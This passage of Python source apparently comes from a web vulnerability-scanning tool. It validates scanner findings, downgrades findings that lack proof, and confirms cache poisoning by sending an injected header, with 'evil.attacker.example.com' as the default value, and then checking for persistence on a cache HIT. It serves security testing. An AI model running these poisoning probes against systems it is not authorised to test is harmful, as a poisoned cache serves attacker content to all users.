        return order[min(idx + 1, len(order) - 1)]
    except ValueError:
        return "LOW"


def _build_reproduction_steps(finding: Any) -> list[str]:
    endpoint  = getattr(finding, "endpoint",  "?")
    parameter = getattr(finding, "parameter", "?")
    evidence  = getattr(finding, "evidence",  "")
    title     = getattr(finding, "title",     "")
    return [
        f"1. Navigate to endpoint: {endpoint}",
        f"2. Identify parameter: {parameter}",
        "3. Send the following test payload (see Raw Request).",
        f"4. Observe response for: {evidence[:150]}",
        "5. Compare against baseline to confirm anomaly.",
        f"6. Title: {title}",
    ]


# ---------------------------------------------------------------------------
# WebValidationAgent — main entry point
# ---------------------------------------------------------------------------

class WebValidationAgent:
    """
    Post-processes all findings from WebVAPTEngine:

      1. Validates evidence meets the required proof level
      2. Downgrades severity when proof is incomplete
      3. Labels under-proven findings "POTENTIAL ISSUE — MANUAL VALIDATION REQUIRED"
      4. Enriches findings with all 12 required fields (Rule 1-9 spec)
      5. Checks target for DVWA and appends DVWA module findings (Rule 9)

    Usage:
        agent    = WebValidationAgent(get_fn=get_fn, post_fn=post_fn, kill_fn=kill_fn)
        findings = await agent.validate_all(findings, surface)
    """

    def __init__(
        self,
        get_fn:  Callable | None = None,
        post_fn: Callable | None = None,
        kill_fn: Callable[[], bool] | None = None,
    ) -> None:
        self._get     = get_fn
        self._post    = post_fn
        self._kill    = kill_fn or (lambda: False)
        self._gen_val = FindingValidator()

    async def validate_all(
        self,
        findings: list[Any],
        surface:  Any | None = None,
    ) -> list[Any]:
        # Rule 9: DVWA enumeration — add DVWA findings if target is DVWA
        base_url = getattr(surface, "base_url", "") if surface else ""
        if base_url:
            try:
                dvwa = DVWAEnumerator(
                    get_fn=self._get, post_fn=self._post, kill_fn=self._kill
                )
                dvwa_findings = await dvwa.enumerate(base_url)
                if dvwa_findings:
                    logger.info("Appending %d DVWA findings", len(dvwa_findings))
                    findings = list(findings) + dvwa_findings
            except Exception as exc:
                logger.warning("DVWA enumeration failed (non-fatal): %s", exc)

        validated: list[Any] = []
        for finding in findings:
            if self._kill():
                break
            enriched = await self._validate_one(finding, surface)
            validated.append(enriched)

        logger.info(
            "Validation complete: %d findings — %d confirmed, %d potential, %d informational",
            len(validated),
            sum(1 for f in validated if getattr(f, "validation_status", "") == "confirmed"),
            sum(1 for f in validated if getattr(f, "validation_status", "") == "potential"),
            sum(1 for f in validated if getattr(f, "validation_status", "") == "informational"),
        )
        return validated

    async def _validate_one(self, finding: Any, surface: Any | None) -> Any:
        module = getattr(finding, "module", "") or ""
        title  = getattr(finding, "title",  "") or ""

        # Route to specialised validator
        if "cache" in module or "cache_poison" in title.lower() or "x-forwarded-host" in title.lower():
            outcome = await self._validate_cache_poisoning(finding)

        elif module == "xss" or (
            "xss" in title.lower()
            and "missing content-security" not in title.lower()
            and "unsafe-inline" not in title.lower()
        ):
            outcome = XSSValidator().validate(finding)

        elif module == "csrf" and "missing csrf token" in title.lower():
            outcome = await CSRFValidator(
                get_fn=self._get, post_fn=self._post, kill_fn=self._kill
            ).validate(finding)

        elif module == "header" or (
            title.lower().startswith("missing") and "header" in title.lower()
        ):
            outcome = HeaderFindingValidator().validate(finding)

        elif module == "sensitive_file":
            outcome = SensitiveFileValidator().validate(finding)

        elif module.startswith("dvwa_"):
            # DVWA findings are pre-validated by DVWAEnumerator — pass through
            return finding

        else:
            outcome = self._gen_val.validate(finding)

        # Fill reproduction steps if not already set
        if not outcome.reproduction_steps:
            outcome.reproduction_steps = _build_reproduction_steps(finding)

        _merge_outcome(finding, outcome)
        return finding

    async def _validate_cache_poisoning(self, finding: Any) -> ValidationOutcome:
        if self._get is None:
            return ValidationOutcome(
                confidence_pct=CONFIDENCE_WEAK,
                validation_status="potential",
                exploit_status="UNVERIFIED",
                downgraded_severity="LOW",
                downgrade_reason="HTTP client not available for cache confirmation.",
                validation_logic=(
                    "Cache poisoning requires clean-request confirmation. "
                    "No HTTP client was provided to this validation agent."
                ),
                fp_checks_performed=["no_http_client_available"],
                exploitability="Cannot confirm — manual re-test required.",
            )

        endpoint = getattr(finding, "endpoint",  "") or ""
        param    = getattr(finding, "parameter", "") or ""
        evidence = getattr(finding, "evidence",  "") or ""

        poison_val = _extract_poison_value(evidence, param)
        validator  = CachePoisoningValidator(get_fn=self._get, kill_fn=self._kill)
        return await validator.validate(
            url=endpoint,
            header_name=param,
            header_value=poison_val or "evil.attacker.example.com",
        )


# ---------------------------------------------------------------------------
# Merge helpers
# ---------------------------------------------------------------------------

def _extract_poison_value(evidence: str, header_name: str) -> str | None:
    m = re.search(r"'([^']{3,80})'", evidence)
    return m.group(1) if m else None


def _merge_outcome(finding: Any, outcome: ValidationOutcome) -> None:
    """Write ValidationOutcome fields back onto a WebFinding dataclass."""
    finding.confidence_pct    = outcome.confidence_pct
    finding.validation_status = outcome.validation_status
    finding.exploit_status    = outcome.exploit_status

    if outcome.comparison_result:
        finding.comparison_result = outcome.comparison_result

    # Severity downgrade
    if outcome.downgraded_severity:
        from modules.web_vapt_engine import WebRiskLevel  # deferred import
        sev_map = {
            "CRITICAL": WebRiskLevel.CRITICAL,
            "HIGH":     WebRiskLevel.HIGH,
            "MEDIUM":   WebRiskLevel.MEDIUM,
            "LOW":      WebRiskLevel.LOW,
            "INFO":     WebRiskLevel.INFO,
        }
        new_sev = sev_map.get(outcome.downgraded_severity)
        if new_sev and new_sev != finding.severity:
            logger.info(
                "Finding '%s' downgraded %s → %s: %s",
                getattr(finding, "title", "?")[:50],
                finding.severity,
                new_sev,
                outcome.downgrade_reason[:80],
            )
            finding.severity = new_sev

    if outcome.raw_request:
        finding.raw_request = outcome.raw_request
    if outcome.raw_response_excerpt:
        finding.raw_response_excerpt = outcome.raw_response_excerpt
    if outcome.reproduction_steps:
        finding.reproduction_steps = outcome.reproduction_steps
    if outcome.validation_logic:
        finding.validation_logic = outcome.validation_logic
    if outcome.fp_checks_performed:
        finding.fp_checks_performed = outcome.fp_checks_performed
    if outcome.exploitability:
        finding.exploitability = outcome.exploitability

    if outcome.validation_status == "potential":
        _add_potential_label(finding)


def _add_potential_label(finding: Any) -> None:
    title = getattr(finding, "title", "") or ""
    if "POTENTIAL ISSUE" not in title.upper():
        finding.title = f"[POTENTIAL ISSUE — MANUAL VALIDATION REQUIRED] {title}"


# ---------------------------------------------------------------------------
# Cache Poisoning Validator (kept from original implementation)
# ---------------------------------------------------------------------------

class CachePoisoningValidator:
    """
    4-step cache poisoning validation:
      1. Baseline clean request (check cacheability)
      2. Poisoned request — check reflection
      3. 300 ms pause + clean request
      4. Poison persists AND cache HIT → CONFIRMED
    """

    def __init__(
        self,
        get_fn:  Callable,
        kill_fn: Callable[[], bool],
        timeout: float = 10.0,
    ) -> None:
        self._get     = get_fn
        self._kill    = kill_fn
        self._timeout = timeout

    async def validate(
        self,
        url:          str,
        header_name:  str,
        header_value: str,
    ) -> ValidationOutcome:
        outcome = ValidationOutcome()

        baseline = await self._get(url)
        if baseline is None:
            outcome.validation_logic = "Baseline request failed — cannot validate."
            outcome.fp_checks_performed.append("baseline_unreachable")
            return outcome

        baseline_body   = getattr(baseline, "text", "") or ""
        baseline_cc     = getattr(baseline, "headers", {}).get("cache-control", "")
        is_cacheable    = any(k in baseline_cc for k in ("public", "max-age", "s-maxage"))
        has_cache_infra = any(
            getattr(baseline, "headers", {}).get(h, "")
            for h in _CACHE_HEADER_NAMES
        )

        outcome.fp_checks_performed.append("baseline_fetched")
        outcome.comparison_result = (
            f"Baseline: cache-control={baseline_cc or 'absent'}, "
            f"cache-infra={has_cache_infra}."
        )

        if not is_cacheable and not has_cache_infra:
            outcome.validation_status = "informational"
            outcome.confidence_pct    = 10
            outcome.exploit_status    = "UNVERIFIED"
            outcome.validation_logic  = (
                "No cacheable response or cache infrastructure detected. "
                "Header reflection without caching is informational only."
            )
            outcome.exploitability = (
                "No cache poisoning possible — response is not cached by any detectable CDN/proxy."
            )
            outcome.fp_checks_performed.append("no_cache_infra_detected")
            return outcome

        poisoned_resp = await self._get(url, headers={header_name: header_value})
        if poisoned_resp is None:
            outcome.validation_logic  = "Poisoned request failed."
            outcome.validation_status = "potential"
            outcome.confidence_pct    = CONFIDENCE_INSUFFICIENT
            outcome.exploit_status    = "UNVERIFIED"
            return outcome

        poisoned_body = getattr(poisoned_resp, "text", "") or ""

        outcome.raw_request = (
            f"GET {url} HTTP/1.1\n"
            f"Host: (target)\n"
            f"{header_name}: {header_value}\n"
        )
        outcome.raw_response_excerpt = poisoned_body[:600]

        reflected = header_value in poisoned_body
        outcome.fp_checks_performed.append(
            f"reflection_check: {'reflected' if reflected else 'not_reflected'}"
        )

        if not reflected:
            outcome.validation_status = "informational"
            outcome.confidence_pct    = 10
            outcome.exploit_status    = "UNVERIFIED"
            outcome.validation_logic  = (
                f"Header value '{header_value}' was NOT reflected. "
                "No poisoning vector detected."
            )
            outcome.exploitability    = "Not exploitable — no reflection of attacker-controlled value."
            return outcome

        await asyncio.sleep(0.3)
        clean_resp  = await self._get(url)
        clean_body  = getattr(clean_resp, "text", "") if clean_resp else ""

        cache_hit_header = ""
        if clean_resp:
            for h in _CACHE_HEADER_NAMES:
                val = getattr(clean_resp, "headers", {}).get(h, "")
                if val:
                    cache_hit_header = f"{h}: {val}"
                    break

        poison_persists = header_value in (clean_body or "")
        is_cache_hit    = bool(
            clean_resp and any(
                _CACHE_HIT_RE.search(
                    getattr(clean_resp, "headers", {}).get(h, "")
                )
                for h in ("cf-cache-status", "x-cache", "x-cache-status", "cdn-cache-status")
            )
        )

        outcome.fp_checks_performed.append(
            f"clean_request_poison_persists: {poison_persists}"
        )
        outcome.fp_checks_performed.append(
            f"cache_hit_on_clean_request: {is_cache_hit}"
        )
        outcome.comparison_result = (
            f"Poisoned request: '{header_value}' reflected={reflected}. "
            f"Clean request: poison_persists={poison_persists}, cache_hit={is_cache_hit}."
        )

        if poison_persists and is_cache_hit:
            outcome.validation_status = "confirmed"
            outcome.confidence_pct    = CONFIDENCE_VERIFIED
            outcome.exploit_status    = "CONFIRMED"
            outcome.validation_logic  = (
                f"CONFIRMED: Poison value '{header_value}' reflected in poisoned response "
                f"AND persisted in clean (no-header) request with cache HIT ({cache_hit_header}). "
                "All 4 validation conditions met."
            )
            outcome.exploitability = (
                f"HIGH — Attacker can serve '{header_value}' as part of application responses "
                "to ALL users who receive the cached page."
            )
            outcome.reproduction_steps = [
                f"1. Send GET {url} with header: {header_name}: {header_value}",
                "2. Confirm attacker value is reflected in response body.",
                f"3. Observe cache HIT indicator ({cache_hit_header}).",
                f"4. Send GET {url} WITHOUT the malicious header.",
                "5. Confirm attacker value still appears in clean response from cache.",
            ]
        elif reflected and not poison_persists:
            outcome.validation_status   = "informational"
            outcome.confidence_pct      = CONFIDENCE_WEAK
            outcome.exploit_status      = "UNVERIFIED"
            outcome.downgraded_severity = "INFO"
            outcome.downgrade_reason    = (
                "Reflection detected but poison did not persist in subsequent clean request."
            )
            outcome.validation_logic = (
                f"Header value '{header_value}' was reflected in the poisoned response "
                "but did NOT appear in the subsequent clean request. "
                "Per spec: reflection ≠ cache poisoning."
            )
            outcome.exploitability = (
                "Not confirmed as cache poisoning. Reflection only — not cached."
            )
            outcome.fp_checks_performed.append("poison_not_confirmed_in_clean_request")
        elif reflected and not is_cache_hit:
            outcome.validation_status   = "potential"
            outcome.confidence_pct      = 45
            outcome.exploit_status      = "UNVERIFIED"
            outcome.downgraded_severity = "LOW"
            outcome.downgrade_reason    = (
                "Reflection confirmed but no cache HIT indicator detected on clean request."
            )
            outcome.validation_logic = (
                f"Header '{header_name}: {header_value}' reflected. "
                "Clean request did not produce a cache HIT signal."
            )
            outcome.exploitability = (
                "Unconfirmed. Requires manual testing to determine if the CDN "
                "caches this endpoint and excludes the header from the cache key."
            )
            outcome.reproduction_steps = [
                f"1. Send GET {url} with {header_name}: {header_value}",
                "2. Confirm value reflected in response (done).",
                "3. MANUALLY verify: send clean request and check CF-Cache-Status/X-Cache.",
                "4. If cache HIT + poison persists → escalate to HIGH.",
            ]
        else:
            outcome.validation_status = "informational"
            outcome.confidence_pct    = 10
            outcome.exploit_status    = "UNVERIFIED"
            outcome.validation_logic  = "No consistent signal detected."
            outcome.exploitability    = "Not exploitable based on current evidence."

        return outcome
